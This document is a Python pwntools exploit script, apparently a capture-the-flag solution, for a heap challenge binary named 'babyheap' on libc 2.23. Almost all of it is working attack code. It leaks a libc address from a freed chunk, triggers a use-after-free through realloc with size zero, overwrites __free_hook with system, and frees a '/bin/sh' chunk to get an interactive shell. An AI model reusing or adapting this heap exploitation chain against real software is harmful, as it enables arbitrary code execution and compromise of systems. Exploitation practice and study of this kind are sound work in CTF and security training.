from pwn import *

elf = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
r = process('./babyheap')

def create_team(length, description):
	r.send('1')
	print r.recvuntil('Description length :')
	r.send(str(length))
	print r.recvuntil('Description :')
	r.send(description)
	print r.recvuntil('>')

def del_team(index):
	r.send('2')
	print r.recvuntil('Index :')
	r.send(str(index))
	print r.recvuntil('>')

def manage_team(index):
	r.send('3')
	print r.recvuntil('Index :')
	r.send(str(index))
	print r.recvuntil('>')

def add_mem(num, mem):
	r.send('1')
	print r.recvuntil('Number of employment :')
	r.send(str(num))
	for i in range(len(mem)):
		print r.recvuntil('Name :')
		r.send(mem[i]['name'])
		print r.recvuntil('Description :')
		r.send(mem[i]['desc'])
	print r.recvuntil('>')

def del_mem(index):
	r.send('2')
	print r.recvuntil('Index :')
	r.send(str(index))

def manage_mem(index, desc):
	r.send('4')
	print r.recvuntil('Index :')
	r.send(str(index))
	print r.recvuntil('Description :')
	r.send(desc)
	print r.recvuntil('>')

def list_mem():
	r.send('3')
	print hexdump(r.recvuntil('>'))

def ret_mem():
	r.send('5')
	print r.recvuntil('>')

print r.recvuntil('>')
create_team(8, 'a'*8)
manage_team(0)

test = {'name': 'a', 'desc': 'a'*8}

# 1. Memory leak
add_mem(2, [test, test])
del_mem(0)
print r.recvuntil('>')
add_mem(1, [test])

r.send('3')
p = r.recvuntil('1.')

heap_leak = u64(p[-8:-2] + '\x00\x00')
libc_base = heap_leak - 0x3c4b78
system = libc_base + elf.symbols['system']
free_hook = libc_base + elf.symbols['__free_hook']

print '[+] heap_leak: ' + hex(heap_leak)
print '[+] libc base: ' + hex(libc_base)
print '[+] system: ' + hex(system)
print '[+] __free_hook: ' + hex(free_hook)

print r.recvuntil('>')

# 2. UAF
r.send('1')
print r.recvuntil('Number of employment :')
r.send('-3')			# realloc(mem, 0) = free(mem)

print r.recvuntil('>')
ret_mem()
create_team(24, p64(free_hook)) # 24byte UAF, *(team + 16) = malloc(24)
manage_team(0)
manage_mem(0, p64(system))		# *(free_hook) = system

mem = {'name' : 'a', 'desc' : '/bin/sh\0'}
add_mem(1, [mem])			# this member is 3rd
del_mem(3)

r.interactive()
